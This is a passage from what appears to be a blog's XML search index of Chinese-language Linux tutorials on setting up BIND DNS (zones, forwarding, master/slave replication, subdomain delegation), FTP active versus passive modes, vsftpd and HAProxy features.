vsftpd 服务 12[root@192 vsftpd_user_conf]# /etc/init.d/vsftpd start 为 vsftpd 启动 vsftpd： [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果服务启动不了，很有可能是前面 21端口占用。测试过程和 pure-ftpd 一样，如果用户无法登录，查看日志 /var/log/srcure]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS安装配置]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F3.%20DNS%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[DNS安装配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 bind 来搭建 DNS 服务，首先安装 bind 1[root@192 ~]# yum install -y bind &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备份配置文件 1[root@192 ~]# cp /etc/named.conf /etc/named.conf.bak &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把默认配置文件清空，然后自定义配置 12[root@192 ~]# &gt;/etc/named.conf[root@192 ~]# vim /etc/named.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入如下配置 123456789101112131415options &#123; directory "/var/named";&#125;;zone "." IN &#123; type hint; file "named.ca";&#125;;zone "localhost" IN &#123; type master; file "localhost.zone";&#125;;zone "0.0.127.in-addr.arpa" IN &#123; type master; file "named.local";&#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置后，修改其属主 12[root@192 ~]# chown named /etc/named.conf[root@192 ~]# cd /var/named &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定义根域配置文件，没有 dig 命令先安装 1[root@192 named]# yum install bind-utils 1[root@192 named]# dig -t NS .&gt;named.ca &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后定义本地域配置 1[root@192 named]# vim localhost.zone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入如下内容 123456789@ IN SOA localhost. admin.localhost. ( 2017041101 1H 10M 7D 1D )@ IN NS localhost.localhost. IN A 127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再定以泛解析配置 1[root@192 named]# vim named.local &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入如下内容 12345678910$TTL 86400@ IN SOA localhost. admin.localhost. ( 2017041101 1H 10M 7D 1D )@ IN NS localhost.1 IN PTR localhost &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测配置是否有问题 1[root@192 named]# named-checkconf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测正解析 1234[root@192 named]# named-checkzone "localhost" /var/named/localhost.zone/var/named/localhost.zone:2: no TTL specified; using SOA MINTTL insteadzone localhost/IN: loaded serial 2017041101OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测反解析 123[root@192 named]# named-checkzone "0.0.127.in-addr.arpa" /var/named/named.localzone 0.0.127.in-addr.arpa/IN: loaded serial 2017041101OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成 rndc.key ，如果没有这个 key ， named 是启动不了的。 123[root@192 named]# rndc-confgen -r /dev/urandom -awrote key file "/etc/rndc.key"[root@192 named]# chown named:named /etc/rndc.key &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动 named 服务 12[root@192 named]# /etc/init.d/named start启动 named： [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看是否有 53 端口 1[root@192 named]# netstat -lnp | grep named &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先测试正向解析 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接着测试反解析 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在只是建立了一个本地的域 localhost ，下面增加一个域名（zone） 1[root@192 named]# vim /etc/named.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加如下内容 12345678zone "123.com" IN &#123; type master; file "123.com.zone";&#125;;zone "137.168.192.in-addr.arpa" IN &#123; type master; file "192.168.zone";&#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否有问题 1[root@192 named]# named-checkconf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑 zone 文件 1[root@192 named]# vim /var/named/123.com.zone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否出错 123[root@192 named]# named-checkzone "123.com" /var/named/123.com.zonezone 123.com/IN: loaded serial 2017041101OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑反解析文件 1[root@192 named]# vim /var/named/192.168.zone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入如下内容 123456789101112$TTL 600@ IN SOA ns.123.com. root.123.com. ( 2017041101 1H 10M 7D 1D )@ IN NS ns.123.com.10 IN PTR ns.123.com.11 IN PTR mail.123.com.73 IN PTR www.123.com. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否出错 123[root@192 named]# named-checkzone "137.168.192.in-addr.arpa" 192.168.zonezone 137.168.192.in-addr.arpa/IN: loaded serial 2017041101OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 named 服务 123[root@192 named]# /etc/init.d/named restart停止 named：. [确定]启动 named： [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试 1[root@192 named]# dig @127.0.0.1 www.123.com 1[root@192 named]# dig @127.0.0.1 -x 192.168.137.11 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;123.com 的域配置好后，要想使用它必须把系统里面的 DNS 服务器 IP 设定为这台机器的 IP ，但是这样也会带来一个问题，它只能解析 123.com 的域名，其他域名不能解析，这时候需要给它配置 DNS 转发。 1[root@192 named]# vim /etc/named.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 options{} 里面增加 12forward first;forwarders &#123;8.8.8.8;&#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两行就是用来配置转发的，该 DNS 服务器不能解析的域名会转发到 8.8.8.8 这个 DNS 服务器上去解析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;任何服务器都有可能因为某些原因导致不能正常提供服务，所以有必要为 DNS 服务器配置一个备用的，但是这两台服务器需要保证数据的一直性，比如更改主上配置把 www.123.com 解析 IP 更改了，那么备用服务器上也得跟着自动变。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面就是配置主从，首先在从服务器上安装 bind 1[root@KVM ~]# yum install -y bind &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后拷贝主上的配置文件到从上，这里主服务器 192.168.0.73 ，从服务器 192.168.0.74 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下操作在主服务器上 1234[root@192 named]# yum -y install openssh-clients[root@192 named]# scp /etc/named.conf 192.168.0.74:/etc/[root@192 named]# scp /var/named/localhost.zone 192.168.0.74:/var/named/[root@192 named]# scp /var/named/named.local 192.168.0.74:/var/named/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从服务器上，拷贝过来后，修改一下 /etc/named.conf 1[root@KVM ~]# vim /etc/named.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上生成 rndc.key 123[root@KVM ~]# rndc-confgen -r /dev/urandom -awrote key file "/etc/rndc.key"[root@KVM ~]# chown named:named /etc/rndc.key &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上启动 named 12[root@KVM ~]# /etc/init.d/named start启动 named： [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动成功后会在 /var/named 下生成一个 slaves 目录，这个目录下会有 192.168.zone 和 123.com.zone 这两个文件，内容是和主上的一样的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在从上测试是否可以解析 1[root@KVM ~]# dig @127.0.0.1 www.123.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面测试主从同步 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主 dns 上更改文件 1[root@192 named]# vim /var/named/123.com.zone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最后一行增加 1123 IN A 1.1.1.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外需要修改一下 第三行的那个数字串，这个是用来做标记的，只有这个数字变化了，才可以一让从自动跟着变，数字只能是变大，不能减小， 把 2017041101 改成 2017041102 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启主 named 服务 123[root@192 named]# /etc/init.d/named restart停止 named：. [确定]启动 named： [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经测试发现一个问题：就是从经常会同步特别慢，这是很要命的。所有需要做一个特殊操作，在主上的 /etc/named.conf 中，123.com 的zone 中增加两行： 12notify yes;also-notify &#123;192.168.0.74;&#125;;]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS服务器(一)：基本原理]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F7.%20DNS%E6%9C%8D%E5%8A%A1%E5%99%A8(%E4%B8%80)%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[DNS服务器(一)：基本原理一、简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网络中的主机通信是通过IP地址来实现的，通常IPv4的地址是四个数字加点组成，如果和每台主机通信我们都要去记忆IP地址的话，这通常对于人类来讲是相当痛苦的。于是网络上就有了一套为了解决这个问题的方案出现了，也就是DNS主机名称解析系统。它是一套能够将数以千万计的IP地址通过查询DNS数据库，轻松的转化成与之对应的一串单词字符串，也就是主机名，网络上称之为域名，相对于IP地址，用单词组成的域名明显好记多了。 二、DNS域名解析系统的层级关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS域名解析系统是有层级关系的，整个层级关系的表现形式就像一棵大树，每一层，我们称之为域。最顶层的域我们通常叫作根域，用点号表示，第二层通常用com、net、edu、gov、mil、org….，这层我们叫作顶级域，往下第三层，也就是我们经常见到的域名了，如,51cto.com，这一层我们称之为二级域，当二级域加上www后，就是第四层了，就这样一直往下细分。域名的写法通常是由小到大，从左往右书写，用点连接，最后加点表示根，整个结构如下图所示： %EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/01.jpeg?raw=true) 三、DNS的资源记录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们要查询这些庞大数据当然要有专门的主机负责这些工作了，提供查询、存储DNS数据服务的主机我们称之为DNS服务器。网络上为了方便域名的注册、管理、解析，将DNS域名映射到特定类型的资源信息，我们称之为资源记录。资源记录是有类型的， 资源记录类型 SOA NS MX A PTR AAAA CNAME 起始授权 域名服务器 邮件交换器 域名–&gt;IP IP–&gt;域名 域名–&gt;IPv6 别名记录 特点：只能有一个，而且必须是第一个 特点：用于表示DNS服务器的域名地址 特点：用于一个域下的邮件使用 特点：我们经常用到的就是它了 特点：和A记录相反，用于反向解析 特点：基本不用 特点：用于作A记录的域名的别名， 四、DNS服务器的工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设我们以wubinary.blog.51cto.com为例： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步：当我们使用DNS客户端请求查询此域名的的A记录时，DNS服务器首先会判断所要查询域名是属于哪个区域，是否在自己的管辖范围，假设此次域名不在管辖范围。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二步：为了确定当前域名是在哪个级别，DNS服务器要向根询求帮助，根会向DNS服务器返回所在域名的顶级域的DNS服务器地址，也就是根的下一级com的DNS服务器地址。此时DNS服器根据这个地址又再次查询，此次查询获得了51cto.com的DNS的服务器地址。于是终于确定了wubinary.blog.51cto.com的区域所在的DNS服务器地址了。DNS服务器的此类确定一个地址，并使用这个址去查询下一个的查询方式我们称之为迭代查询。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三步：确定了区域地址后，51cto.com为了向DNS服务器返回结果需要一级一级的往下查。一开始查询到了blog.51cto.com的DNS服务器地址，于是blog.51cto.com的DNS服务器则向下查询。blog.51cto.com又查询到了wubinary.blog.51cto.com的DNS服务器地址，此时的地址正是DNS服务器要找的地址。到了这一步，wubinary.blog.51cto.com的DNS服务器则会把结果向它的上级汇报，于是上一级又向上一级汇报，最终结果回到了最初的DNS服务器，此时DNS客户端才能获得最终的IP地址。像这样DNS服务器的数据逐级遍历及逐级返回的过程，我们称之为递归查询。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果我们查询的域名正好和当前查询使用的DNS服务器所匹配，则DNS服务器会先查询本地缓存是否存在，如果存在则返回缓存数据，如果不存在则去数据文件中读取数据并运回结果。 五、三个与解析有关的配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/hosts：此文件早期在没有出现DNS服务器的时候，作用和DNS服务器类似，不过随着网络的发展，单个文件根本无法满足需求，于是，此文件通常运用于本地IP解析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/resolv.conf：定义DNS服务器IP地址，本地解析域名通常使用的都是这里面定义的IP地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/nsswitch.conf：这个文件则是来决定先要使用/etc/hosts还是/etc/resolv.conf的设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结：理解DNS的树状结构、递归及迭代查询后，其它就好办了。]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS介绍]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F2.%20DNS%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[DNS介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS 为 Domain Name System （域名系统）的缩写，它是一种将 ip 地址转换成对应的主机名或将主机名转换成与之相对应 ip 的一种服务机制。其中通过域名解析出 ip 地址的叫做正向解析，通过 ip 地址解析出域名的叫做反向解析。 DNS 使用 TCP 和 UDP ，端口号都是53，但它主要使用 UDP ，服务器之间备份使用 TCP 。全世界只有 13 台 “根”服务器，1 个根服务器放在美国，其他 12 台为辅根服务器，DNS 服务器根据角色可以分为：主 DNS 、从 DNS 、缓存 DNS 服务器，DNS 转发服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先来看看域名的结构组成，平时访问网站的时候，都会用一个域名去请求，比如 www.baidu.com ，其实在 com 后面还有一个点，这个点叫做根域。下图是一个域名的树状结构，根域下面会有 .com .cn .net 等顶级域，在顶级域下面又有了第二层域，比如 www.baidu.com 或者 .com.cn ，而 www.baidu.com则为子域，我们经常用子域来作为网站的域名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有了网站域名，下面来看看，域名是如何解析到 ip 的，下图为域名解析过程流程图 在浏览器中输入 www.sina.com.cn 域名，操作系统会先检查子机本地的 hosts 文件是否有这个网站映射关系，如果有，就先调用这个 IP 地址映射，完成域名解析。 如果 hosts 里没有这个域名的映射，则查找本地 DNS 解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 如果 hosts 与本地 DNS 解析器缓存都没有相应的网址映射关系，首先会找本机设置的首选 DNS 服务器，在此我们叫它本地 DNS 服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 如果要查询的域名，不由本地 DNS 服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个 IP 地址映射，完成域名解析，此解析不具有权威性。 如果本地 DNS 服务器本地区域文件与缓存解析都失效，则分局本地 DNS 服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地 DNS 就把请求发至 13 台根 DNS ，根 DNS 服务器收到请求后会判断这个域名是谁来授权管理 ，并会返回一个负责该顶级域名服务器的一个 IP 。本地 DNS 服务器收到 IP 信息后，将会联系负责 域的这台服务器。这台负责 域的服务器收到请求后，如果自己无法解析，它就会找一个管理 管理域的下一级 DNS 服务器地址给本地 DNS 服务器。当本地 DNS 服务器收到这个地址后，就会找这个域服务器，重复上面的动作，进行查询，直至找到 www.sina.com.cn 主机。 如果用的是转发模式，此 DNS 服务器就会把请求转发至上一级服务器进行解析，上一级服务器如果不能解析，或找根 DNS 或把转请求转至上上级，以此循环。不管是本地 DNS 服务器用是是转发，还是根提示，最后都是把结果返回给本地 DNS 服务器，由此 DNS 服务器再返回给客户机。]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ftp的主动模式与被动模式的区别是什么？]]></title>
    <url>%2F2017%2F08%2F10%2FFTP%2F3.%20ftp%E7%9A%84%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[ftp的主动模式与被动模式的区别是什么？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FTP协议有两种工作方式：PORT方式和PASV方式，中文意思为主动模式和被动模式 一、什么是主动FTP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主动模式的FTP工作原理：客户端从一个任意的非特权端口N连接到FTP服务器的命令端口，也就是21端口。然后客户端开始监听端口N+1，并发送FTP命令“port N+1”到FTP服务器。接着服务器会从它自己的数据端口（20）连接到客户端指定的数据端口（N+1）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 针对FTP服务器前面的防火墙来说，必须允许以下通讯才能支持主动方式FTP： 任何大于1024的端口到FTP服务器的21端口。（客户端初始化的连接） FTP服务器的21端口到大于1024的端口。 （服务器响应客户端的控制端口） FTP服务器的20端口到大于1024的端口。（服务器端初始化数据连接到客户端的数据端口） 大于1024端口到FTP服务器的20端口（客户端发送ACK响应到服务器的数据端口） 二、什么是被动FTP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了解决服务器发起到客户的连接的问题，人们开发了一种不同的FTP连接方式。这就是所谓的被动方式，或者叫做PASV，当客户端通知服务器它处于被动模式时才启用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在被动方式FTP中，命令连接和数据连接都由客户端发起，这样就可以解决从服务器到客户端的数据端口的入方向连接被防火墙过滤掉的问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当开启一个 FTP连接时，客户端打开两个任意的非特权本地端口（N &gt; 1024和N+1）。第一个端口连接服务器的21端口，但与主动方式的FTP不同，客户端不会提交PORT命令并允许服务器来回连它的数据端口，而是提交 PASV命令。这样做的结果是服务器会开启一个任意的非特权端口（P &gt; 1024），并发送PORT P命令给客户端。然后客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于服务器端的防火墙来说，必须允许下面的通讯才能支持被动方式的FTP: 从任何大于1024的端口到服务器的21端口（客户端初始化的连接） 服务器的21端口到任何大于1024的端口（服务器响应到客户端的控制端口的连接） 从任何大于1024端口到服务器的大于1024端口（客户端初始化数据连接到服务器指定的任意端口） 服务器的大于1024端口到远程的大于1024的端口（服务器发送ACK响应和数据到客户端的数据端口） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上面可以看出，两种方式的命令链路连接方法是一样的，而数据链路的建立方法就完全不同，如下图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FTP服务器的主动工作模式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FTP服务器的被动工作模式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上关于主动和被动FTP的解释，可以简单概括为以下两点： 1.主动FTP： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令连接：客户端 &gt;1024端口 -&gt; 服务器 21端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据连接：客户端 &gt;1024端口 &lt;- 服务器 20端口 被动FTP： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令连接：客户端 &gt;1024端口 -&gt; 服务器 21端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据连接：客户端 &gt;1024端口 -&gt; 服务器 &gt;1024端口 三、主动模式ftp与被动模式FTP优点和缺点：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主动FTP对FTP服务器的管理和安全很有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[haproxy 的特性]]></title>
    <url>%2F2017%2F08%2F10%2FHaproxy%2F3.%20hapronxy%20%E7%9A%84%E7%89%B9%E6%80%A7%2F</url>
    <content type="text"><![CDATA[千万级高并发负载均衡软件HaProxy&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;负载均衡软件中，硬件设备有：F5，Big-IP等 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基于软件的：HAProxy, LVS, Nginx等，在软件发负载均衡中，又分为两种实现方式，分贝时基于操作系统的负载均衡如：lvs, 和基于第三方应用实现的软件负载均衡。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HAProxy 是一款提供高可用性、负载均衡以及基于TCP（第四层）和HTTP（第七层）应用的代理软件，支持虚拟主机，它是免费、快速并且可靠的一种解决方案。 HAProxy特别适用于那些负载特大的web站点，这些站点通常又需要会话保持或七层处理。HAProxy运行在时下的硬件上，完全可以支持数以万计的 并发连接。并且它的运行模式使得它可以很简单安全的整合进您当前的架构中， 同时可以保护你的web服务器不被暴露到网络上。它的优点如下： 可靠性和稳定性非常好，可以与硬件F5负载均衡设备相媲美 最高可以同时维护40000-50000个并发连接，单位时间内处理的最大请求数为20000个，最大数据处理能力可达10Gbps。作为软件级别的负载均衡来说，HAProxy性能可以见一般 支持多于8种负载均衡算法，同时支持session保持 支持虚拟主机功能，这样实现web负载均衡更加灵活 从haproxy1.3版本后开始支持连接拒绝，全透明代理等功能，这些功能是其他负载均衡器锁不具备的。 haproxy拥有一个功能强大的服务器转台监控界面，通过此页面可以实时连接系统的运行状况， haproxy拥有强大的acl支持，能给使用带来更大的方便。]]></content>
      <tags>
        <tag>haproxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS服务器(三)：子域授权及转发]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F9.%20DNS%E6%9C%8D%E5%8A%A1%E5%99%A8(%E4%B8%89)%EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[DNS服务器(三)：子域授权及转发一、DNS服务器子域授权的实现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常自己架设DNS服务器给自己使用的公司都是内部有特殊需求，或者公司内部域名较多，为了方便以后的管理而架设。我们知道一个域名就是一个区域，一般每个区域都会有专人负责管理，当一个公司人员足够多时，这时就会有划分子域给下级部门管理的需求。在一个区域下划分子域，并给子域指定一个新的DNS服务器，这种方法是可以实现的，我们通常称这种划分子区域的方法为子域授权。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例：给wubinary.com域名划分一个blog.wubinary.com的子域。bind的安装配置及主DNS服务器的架设不再此讨论 首先架设一个主DNS服务器，编辑/var/named/wubinary.com.zone文件，主DNS服务器的IP为192.168.0.6，资源记录数据文件如下： 12345678910111213141516$TTL 600@ IN SOA dns.wubinary.com. dnsadmin.wubinary.com. ( 2014031203 2H 4M 1D 2D )@ IN NS dns.wubinary.com.@ IN NS ns2.wubinary.com.@ IN MX 10 mail.wubinary.com.dns IN A 192.168.0.6mail IN A 192.168.0.12www IN A 192.168.0.48ns2 IN A 192.168.0.80blog.wubinary.com. IN NS dns.blog.wubinary.com.dns.blog.wubinary.com. IN A 192.168.0.2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，以上最后两行为子域的DNS服务器，只要在主DNS服务器定义好了子域的DNS服务器就等于给子域授权了。 然后在回到子域的服务器，192.168.0.2上配置子域区域。打开/etc/named.rfc1912.zones文件，在最末尾定义子域的区域。 1234zone "blog.wubinary.com" IN &#123; type master; file "blog.wubinary.com.zone";&#125;; 接着再定义子域DNS服务器的资源记录文件，/var/named/blog.wubinary.com.zone。 1234567891011$TTL 600@ IN SOA dns.blog.wubinary.com. dnsadmin.blog.wubinary.com. ( 2014031201 1H 5M 3D 1D )@ IN NS dns.blog.wubinary.com.dns IN A 192.168.0.2www IN A 192.168.0.78ftp IN A 192.168.0.23 重新启动两边的DNS服务，测试一下子域授权是否成功。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主域机器测试： %EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91/01.jpeg?raw=true) %EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91/02.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;子域机器测试： %EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91/03.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试正常，操作成功！ 二、DNS服务器域名解析转发&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS转发的意义在于，定向查询，一台DNS服务器在获取到查询请求时，自己不尝试解析域名，而转发查询请求给指定的DNS服务器实现此次解析操作。假设，我们现在碰到这么一种情况，我们的DNS服务器是处在一个内网的网段，与外网不能直接通信，在这个局域网中唯一一个能和外网通信的是路由器或者其它的DNS服务器。那么如果我们想要实现通过这台局域网的DNS服务器查询解析外网的域名，就要用到转发的功能了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;转发可以用参数forwarders和forward实现： 12forwarders &#123; IP_ADDR1; IP_ADDR; ...&#125;;forward &#123; only|first &#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数说明： forwarders：用于定义转发的服务器的IP地址，可以写多个，用分号隔开。 forward：用于定义转发的操作，only为只作转发操作，有结果则返回结果，没有结果则什么操作也不作；first为先作转发操作，如果没有结果则去递归查找。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全局和区域： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这两个参数可以放在全局定义，也可放在区域定义，也可以两个同时使用，但不管怎样，放在区域的优先权更高。如果用于特定区域则把转发定义在区域内，如果用于全局，则把转发定义在全局。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;转发实例：让上面的区域wubinary.com可以实现解析外网的域名。 区域wubinary.com所设的DNS服务器为局域网的IP地址，不可以解析外网域名。 %EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91/04.jpeg?raw=true) 由上图可以看出wubinary.com区域不能解析51cto.com的NS记录，我们添加一个转发功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑/etc/named.conf文件，添加转发ip 192.168.0.1 %EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91/05.jpeg?raw=true) 修改完成后，重启服务，测试一下，可以解析了，转发成功！ %EF%BC%9A%E5%AD%90%E5%9F%9F%E6%8E%88%E6%9D%83%E5%8F%8A%E8%BD%AC%E5%8F%91/06.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：有的时候，如果我们事先已经知道了某个区域DNS服务器的地址，为了不让当前DNS服务器向根查询结果，那么我们就可以直接使用转发，向当前DNS服务器指定一个地址，让它查询直接向这个地址请求，这样做的好处能明显的提高响应速度。 三、DNS中的访问控制列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有的时候我们须要在DNS配置文件中指定n个IP地址，如果全都写在一起的话，每块地方都要写一次，那么相当麻烦，如果使用一个参数定义那一片的IP地址，那么管理起来就相当方便了，这个就是DNS中的ACL,bind支持的访问控制表。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式： 1234567 acl ACL_NAME &#123; 172.16.0.0/16; 192.168.0.0/24 127.0.0.0/8; ... ...&#125;; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在全局选项中定义ACL，给每个ACL取一个名字，这样以后每次引用，只须在填定IP地址的地方填写那个变量就行了。在bind中有几个事先定义好的ACL: 1234any: 任何主机none: 无一主机local: 本机localnet: 本机的所在的网络]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[haproxy 配置文件结构]]></title>
    <url>%2F2017%2F08%2F10%2FHaproxy%2F1.%20HAProxy%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%2F</url>
